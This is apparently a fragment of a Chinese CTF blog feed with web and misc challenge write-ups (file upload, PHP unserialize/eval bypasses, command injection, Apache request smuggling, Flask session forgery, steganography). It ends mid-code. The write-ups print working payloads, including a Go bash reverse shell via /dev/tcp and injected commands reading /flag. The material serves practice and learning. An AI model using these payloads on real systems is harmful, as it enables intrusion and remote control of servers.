class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://15e46d8b.clsadp.com/Adm1nUp104d&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;uploadfilename&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传上去之后抓包将 name改为file </p><p>这里问后端java舍友说是因为后端可能存在一个名为file的变量来接受他 所以这里要改为file tql 终于明白了</p><p>因此<code> &lt;input type=&quot;file&quot; name=&quot;uploadfilename&quot; id=&quot;file&quot;&gt;&lt;br&gt;</code>中的name值不是固定的 要根据情况而定</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686235767394-f3ed6a07-925e-44c0-939f-3166d70d17a3.png" alt="img"></p><p>然后上传go的反弹shell文件(偷的) 如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span>)</span><br><span class="line">    out, err := cmd.CombinedOutput()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">      log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">  &#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就可以了 真的tql</p><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>这道题目很可惜 应该是出了的 通过反射来修改类的的私有属性</p><p>源码如下;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getFlag</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password==<span class="string">&quot;sectet&quot;</span> ) <span class="comment">//how to change the private variables secret&quot;</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">  @<span class="keyword">eval</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看了大佬的WP 有个很简单的非预期</p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>直接通过%0a 换行符进行bypass</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685803232225-93d4798a-5be8-4d62-a11b-e8aac6f367da.png" alt="img"></p><p>payload：<code>a=system%0a(&#39;cat /flag&#39;);</code></p><p> 以后做题 <code>%00 空字符 %20 空格符 %0a 换行符</code>这种非预期要多尝试</p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>草！！！！！！！！！！！！</p><p>这个题目 回过头再看我的payload是对的 只不过把<code>sectet</code>拼成<code>secret</code>不是 sectet是什么啊 我真服了 我一直当作secret在做题 md 我真无语了 sectet到底是出题人拼错了 还是有含义啊 我真服了</p><p>利用PHP反射来给私有属性赋值以及调用私有函数</p><p>参考这篇文章：分析的很细 <a href="https://juejin.cn/post/6844904148891074568">https://juejin.cn/post/6844904148891074568</a></p><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getFlag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$get_flag</span> = <span class="keyword">new</span> <span class="title function_ invoke__">getFlag</span>();</span><br><span class="line"><span class="variable">$refClass</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;getFlag&#x27;</span>);</span><br><span class="line"><span class="variable">$property</span> = <span class="variable">$refClass</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;password&#x27;</span>); <span class="comment">//获取属性值</span></span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>); <span class="comment">//修改对象$property的可访问属性</span></span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$get_flag</span>, <span class="string">&#x27;sectet&#x27;</span>);  <span class="comment">//修改值</span></span><br><span class="line"><span class="variable">$property</span> = <span class="variable">$refClass</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;cmd&#x27;</span>);<span class="comment">//获取属性值</span></span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);<span class="comment">//修改对象$property的可访问属性</span></span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$get_flag</span>, <span class="string">&#x27;ls /&#x27;</span>); <span class="comment">//修改值</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$get_flag</span>); <span class="comment">//打印源对象属性值</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//class getFlag#1 (2) &#123;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$password</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;secret&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$cmd</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;ls /&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">a=<span class="variable">$get_flag</span> = <span class="keyword">new</span> <span class="title function_ invoke__">getFlag</span>();<span class="variable">$refClass</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;getFlag&#x27;</span>);<span class="variable">$property</span> = <span class="variable">$refClass</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;password&#x27;</span>); <span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>); <span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$get_flag</span>, <span class="string">&#x27;sectet&#x27;</span>);  <span class="variable">$property</span> = <span class="variable">$refClass</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;cmd&#x27;</span>);<span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);<span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$get_flag</span>, <span class="string">&#x27;ls /&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685805828849-a21b53f3-1ce1-41c7-a71d-3c0796298211.png" alt="img"></p><h2 id="Esc4pe-T0-Mong0"><a href="#Esc4pe-T0-Mong0" class="headerlink" title="Esc4pe_T0_Mong0"></a>Esc4pe_T0_Mong0</h2><p>没源码 暂定</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>一道关于图片隐写的题目 直接 <code>zsteg -a 1.png|grep &quot;flag&quot;</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686062254676-b77d0ea0-ca69-4769-914c-58379f6e7b6b.png" alt="img"></p><h2 id="可是雪啊飘进双眼"><a href="#可是雪啊飘进双眼" class="headerlink" title="可是雪啊飘进双眼"></a>可是雪啊飘进双眼</h2><p>首先是一段音频和一个文本 然后拖进Audacity查看波形图 一段摩斯电码 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686062510940-7c390b3f-68a7-411f-94c4-5d22536f7537.png" alt="img"></p><p>上网查一下学习一下 得到<code>.-- --- .- .. ... .... .- -. -..- ..</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686063064061-e8f63abe-d04f-4cec-bd58-a675810b402e.png" alt="img"></p><p>得到密文WOAISHANXI</p><p>但是还是没法解开加密的压缩包</p><p>然后还有一个文本 从名字上能看出是snow加密 </p><p>在<a href="https://darkside.com.au/snow/%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC">https://darkside.com.au/snow/下载一个脚本</a> 输入刚才得到的密码 然后解密即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snow.exe -p WOAISHANXI -C snow.txt</span><br></pre></td></tr></table></figure><p>得到</p><p>获得flag压缩包的密码</p><p>然后我这里binwalk抽风了 很奇怪 之前用的好好的 玛德</p><p> 找到原因了 原来要用root运行在之后加上 <code>--run-as=root</code>就可以了</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pop链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTFRound#13 Web</title>
      <link href="/post/a2e74ccf.html"/>
      <url>/post/a2e74ccf.html</url>
      
        <content type="html"><![CDATA[<p>NSSCTFRound#13 Web</p><span id="more"></span><h1 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h1><p>一道简单的session伪造题目 </p><p>登录框 找回密码处抓包可以看到key <code>th3f1askisfunny</code></p><p>然后session伪造即可</p><p>这里稍微注意一下就是<code>&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: &#39;265688f22c7df9002e7945b00aed58a7d242ad62b885769d87fd147973f6e663d4e0cdece191e918da66579e1ae54cd9c622333f1832675ef4d8e3f28a66286e&#39;, &#39;_user_id&#39;: &#39;2&#39;&#125;</code></p><p>以往我们都是将name改为admin即可 这道题目将2改为1即可 改为0的话就是没登录状态</p><h1 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h1><p>factors是linux自带的一个因式分解命令</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889160546-2005ec4d-9a98-4a80-9e14-fee82b88af57.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889248604-c2be769c-5f1d-4597-a7ea-285b97e3c2a4.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889267180-68e09028-c066-4c24-8a06-3d5b1870d89d.png" alt="img"></p><p>发现题目显示的结果与我们在linux执行factor一样 那么猜测这里存在命令执行</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889334541-7c569cc4-1cdf-47cb-ba3a-af0cfd2d6d4a.png" alt="img"></p><p>发现我们执行命令是可以的 读一下&#x2F;etc&#x2F;passwd</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685889385397-f451cb1c-983c-4bd0-9d57-d71c0e036345.png" alt="img"></p><p>也是有回显的 说明我们命令是执行成功的 但是输出结果过滤掉了除冒号和数字以外的符号</p><p>这里注意一下要将我们路径中的斜杠需要url编码一下 防止与url中的反斜杠产生歧义</p><p>所以我只要使其输出全部为数字 就能bypass了</p><p>这里用到了od命令</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890407040-e7f3bcc3-2733-4f05-b105-964779b50649.png" alt="img"></p><p>payload:<code>114514;od%20-t%20d1%20%2Fflag</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890848402-df76c787-edac-4b49-8e87-e33f941eb3ef.png" alt="img"></p><p>od -t d1的命令解释：<img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890875226-8b96b7b2-8dcf-463b-83c9-3b0698dcce6b.png" alt="img"></p><p>输出了每个字节按十进制输出</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685890900112-c8886efe-e6d4-447b-9282-10d0ab6bce08.png" alt="img"></p><p>注意前面的是序号</p><p>78   83   83   67   84   70  123  101   99   52   52   49  102   52   98   45 52   50   48  101   45   52   48   53   55   45   56   51   53   97   45   51 97   50   50   53  102   98   99   56  102   53   57  125   10</p><p>将每个十进制转为十六进制然后转为字符串即可</p><p>十六进制：4E 53 53 43 54 46 7B 65 63 34 34 31 66 34 62 2D 34 32 30 65 2D 34 30 35 37 2D 38 33 35 61 2D 33 61 32 32 35 66 62 63 38 66 35 39 7D 0A</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685891274348-6b1b73c6-5ab4-4a85-a054-4c690fa0399c.png" alt="img"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>这个题目做的很懵逼 </p><p>访问index.php 有个文件包含</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685891636930-b6f7fd18-9e51-4da2-bbff-8f3bad0af203.png" alt="img"></p><p>payload的是：<code>GET /nssctf/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/flag.txt HTTP/1.1</code></p><p>最终在请求包中达到的效果为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /nssctf/<span class="number">1</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost</span><br><span class="line"></span><br><span class="line">GET /flag.txt HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685891844152-426610f9-325e-4931-8a2e-4c11ec531881.png" alt="img"></p><p>看大佬WP是Apache HTTP Server 请求走私漏洞 CVE-2023-25690  参考：<a href="https://xz.aliyun.com/t/12345">https://xz.aliyun.com/t/12345</a></p><p>还有CRLF注入 参考<a href="https://www.cnblogs.com/mysticbinary/p/12560080.html">https://www.cnblogs.com/mysticbinary/p/12560080.html</a></p><p> 问了一下GPT 感觉说的很到位</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893209885-190c8bdf-5096-432d-aa41-1e3b330ed3f9.png" alt="img"></p><p>比如我们可以bp抓包一下 就可以看到请求体内容结尾都是<code>\r\n</code>结尾的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893262097-fc9bc818-3057-40e5-9682-ff08840dfb9b.png" alt="img"></p><p>在HTTP当中HTTP的Header和Body之间就是用两个crlf进行分隔的，如果能控制HTTP消息头中的字符，就能注入一些恶意的换行</p><p>比如chatGPT在其中恶意添加<code>crlf</code>(<code>\r\n</code>) 再加入一个恶意制造的请求体 导致解析出问题</p><p>回到题目 读 <code>/usr/local/apache2/conf/httpd.conf </code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893714348-0be9e595-5bb8-4700-a349-65a365c46e4b.png" alt="img"></p><p>看大佬wp是 做了个proxy转发</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685893829245-9b00596b-9ab3-444f-9071-919a318397fc.png" alt="img"></p><p>这也就是为什么payload访问的是localhost 从内部网上的服务器去读flag.txt</p><h1 id="MyWeb"><a href="#MyWeb" class="headerlink" title="MyWeb"></a>MyWeb</h1><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="comment">// 写了个网页存储JSON数据，但是还不会处理json格式，这样处理应该没有什么问题吧</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;save&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;]&#x27;</span>, <span class="string">&quot;, &#x27;<span class="subst">$value</span>&#x27;]&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;read&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$data = &#x27;</span> . <span class="variable">$data</span> . <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似于一个沙箱逃逸吧 构造特殊的方式来bypass</p><p>mode&#x3D;save 读入 mode&#x3D;read 读出</p><p>主要是： <code>$data = str_replace(&#39;]&#39;, &quot;, &#39;$value&#39;]&quot;, $data);</code>利用这个逃逸</p><p>我们不输入任何内容直接读一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685975601896-db938c1a-e2b4-45c2-97f5-9d5776fb37c5.png" alt="img"></p><p>发现只有一个元素1</p><p>这里就类似于构造sql注入一样 构造让<code>[]</code>去闭合再加上注释加换行<code>%0a</code> 相互换来换去 总有一种方式可以</p><p>原来形式猜测是[1]</p><p>替换后<code>[1,$value]</code></p><p>则我们构造<code>];//%0a&lt;shell&gt;;//%0a[</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685976182529-dead647c-0922-4d2b-b2b1-ac053420687a.png" alt="img"></p><h1 id="flask-jwt-hard"><a href="#flask-jwt-hard" class="headerlink" title="flask?jwt?(hard)"></a>flask?jwt?(hard)</h1><p>这道就是第一道的加强版 key没有给我们 所以只能去找</p><p>发现提示 有个路由<code>/wor</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685976386165-68580a32-578a-4527-a49c-081a5a841acf.png" alt="img"></p><p>发现它可以获取我们上次的登陆时间 </p><p>当时这里就没有思路了</p><p>看了WP 访问<code>/wor</code>让其报错 然后能看到源码中的key</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685977285646-aec5a446-c9c9-459d-9a35-1122b6cb80bc.png" alt="img"></p><p>key：<code>hardgam3_C0u1d_u_f1ndM3????</code></p><p>这样获取key的方式还是第一次见 涨知识了 </p><p>接着就是老套路 session伪造获取flag即可</p><p>这里session伪造的时候把后面关于时间的数据去掉，或者加上引号，不然会报错</p><h1 id="TimeTrcer"><a href="#TimeTrcer" class="headerlink" title="TimeTrcer"></a>TimeTrcer</h1><p>放过自己</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask session伪造 </tag>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN-16 国赛初赛后的复现以及一些感悟</title>
      <link href="/post/5cb82439.html"/>
      <url>/post/5cb82439.html</url>
      
        <content type="html"><![CDATA[<p>CISCN-16</p><span id="more"></span><h1 id="感悟以及想法"><a href="#感悟以及想法" class="headerlink" title="感悟以及想法"></a>感悟以及想法</h1><p>不出意外，国赛初赛还是一道题都没有做出来，有太多知识我还没有去掌握，有太多题目我还没有去做，赛前总是满腔热血总想大干一番，但是总是一道题目都做不出来，抑郁一下午。</p><p>每次比赛结束看了wp总是说哪个哪个题目真简单，太可惜了，但是，事实真是如此吗。</p><p>什么是难题？</p><p>我认为这个问题具有相对性，相对于人，也相对于时空。</p><p>相对于人：一道题目，如果对于知识储备量多的人而言，见多识广，则在审题中则会发现端倪，甚至是一眼丁真，而对于一个知识储备量并不是很充足的人来说，可能拿到题目并不能找到他的考点，甚至是四处乱撞，而我，在这次比赛中就是如此，一道题目不知道他的考点就会根据我能捕捉到到的或者是题目泄露出来仅有的信息去逐个逐个检索，可能运气好会检索出来，但是失败总是来得更加频繁。</p><p>相对于时空：我会成长，做题亦如此。一道现在做不出来的题目，之后去认真学习以及回顾，那么当之后再遇到此类型的题目时候就不至于一头雾水。</p><p>那么难题，就我自己的看法，在比赛中做不出来的题目则就是难题，当然这是存在前提，一些人为导致的前提，比如由于出题人的不严谨可能一道很简单的考点硬是要通过去猜的方式才能做出来，或者夹杂着出题人自身色彩的题目，题目终归是要回归于大众，那么受众群体应该是做题的人，如果通过先去了解出题人再去了解题目，这就有点本末倒置了（这里主要是指WEB方向，与社工相异）。</p><p>所以纯是看了WP而认为是简单题的，可能只是题目复杂度比较小，陌生程度比较低，但是总归 比赛中做不出来的题目那就是对于自身的难题。</p><p>再来谈谈PY</p><p>这次国赛PY程度堪称让我瞠目结舌，即便在我身边也存在。</p><p>当然，我也存在。</p><p>我总是在一些比赛中，做题做着做着，突然就没了思路，然后就想问问其他人一些思路，总是想着也许我获取一点帮助就能做出来呢（因为我这个人总是比较爱钻牛角尖，有时候会在一些没意义的地方停留很久），其实我认为这种只是获取一点思路的帮助，虽然不对，但是不会很恶劣，他具有一定的积极性质，可能通过寻求一点思路就把这道题目做出来，那么正向反馈是很客观的。相比于更为受人唾弃的则是，一点不了解题目甚至是没有仔细审题，直接去PY做法的，我觉得这种行为做法并没有一点实际意义，本来CTF就是以赛促学，最终目的是掌握这个知识，而不是排名，当然随着商业化模式的侵蚀与在当今社会下浮躁的心态，静下心来学习是一件难能可贵的事情。</p><p>举个简单的例子比如Flask的SSTI，payload有很多，一开始我认为直接用一个脚本去注入，不是很方便很简单嘛，但是如果题目稍稍变动，那么脚本的局限性质就会体现出来，毕竟脚本是人为提前编译好的，题目稍稍改动加修改就会让脚本无法用。当然，对于已经掌握了这个知识的大佬，通过脚本实现一些对他而言无意义的机械重复式的操作，也是没毛病的，毕竟大佬会，只是一个做与不做的问题。而对我，并没有熟练的掌握，却透过脚本干一些本末倒置的事情是毫无意义的。</p><p>最后，我认为web是一个需要沉淀的方向，他需要大量的基础功底以及语言功底，我只是一个普通人无法做到短时间就能拿到我自己认为有价值的排名也好，奖项也好，只能说任重而道远。</p><p>以上只是我单方面的赛后想法以及总结，只是用来鞭策与提醒我自己不忘初心，希望未来能更好。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685547094038-d6d9bea7-62c7-47b3-830a-1b9ac0671965.jpeg" alt="img"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="UNZIP"><a href="#UNZIP" class="headerlink" title="UNZIP"></a>UNZIP</h2><p>考点：软链接</p><p>这是一道2021深育杯的原题  <a href="https://xz.aliyun.com/t/10533#toc-4">https://xz.aliyun.com/t/10533#toc-4</a></p><p>首先是一个上传文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685371919081-97f89941-b813-493c-a0a6-dc9c9cd10df2.png" alt="img"></p><p>之后给了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ 